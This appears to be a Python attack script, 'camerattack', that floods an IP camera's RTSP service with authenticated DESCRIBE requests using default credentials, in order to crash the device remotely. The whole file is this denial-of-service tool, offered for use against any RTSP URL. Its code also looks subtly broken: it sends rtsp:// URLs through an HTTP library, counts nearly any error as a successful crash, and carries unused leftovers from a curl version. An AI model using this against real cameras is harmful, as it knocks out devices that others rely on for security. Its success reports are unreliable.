import os
import sys
import requests
from requests.auth import HTTPBasicAuth
from colorama import Fore, Style
from halo import Halo
import time

threads = 8

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
def do_not_write(b, _):
    return len(b)

def rtsp_describe(target, count):
    try:
        response = requests.request(
            'DESCRIBE',
            target,
            auth=HTTPBasicAuth('admin', '12345'),  # Replace with your credentials
            headers={'Accept': 'application/sdp'},
            stream=True,
            verify=False  # Disable SSL verification (use cautiously)
        )

        response.raise_for_status()

    except requests.exceptions.RequestException as e:
        if "Couldn't connect to server" in str(e):
            print(f"{Fore.RED}✖ Can't access stream {target}{Style.RESET_ALL}")
            sys.exit(1)

        print(f"{Fore.GREEN}✓ After {count} tries, the camera seems to have crashed.{Style.RESET_ALL}")
        sys.exit(0)

def main():
    red = Fore.RED + Style.BRIGHT

    args = sys.argv[1:]
    if len(args) == 0:
        print("usage: camerattack [RTSP URL]\n\texample: `python camerattack.py rtsp://admin:12345@192.168.1.1:554/live.sdp`\n")
        sys.exit(1)

    target = args[0]

    spinner = Halo(text='Starting up...', spinner='dots')
    spinner.start()

    for count in range(0, 100000, threads):
        spinner.text = f"[Attempt #{count} to #{count+threads-1}] Attacking RTSP stream..."
        spinner.start()

        for thread in range(count, count+threads):
            rtsp_describe(target, thread)

    spinner.stop()
    print(f"{red}✖ Could not crash camera after 100000 attempts.")
    print("You can try to run the program again, but it's unlikely that this camera can be remotely shut down.")
    print("The reason can be that the network speed and stability between you and the camera is not good enough")
    print("to send requests to the camera quickly enough.")

if __name__ == "__main__":
    main()
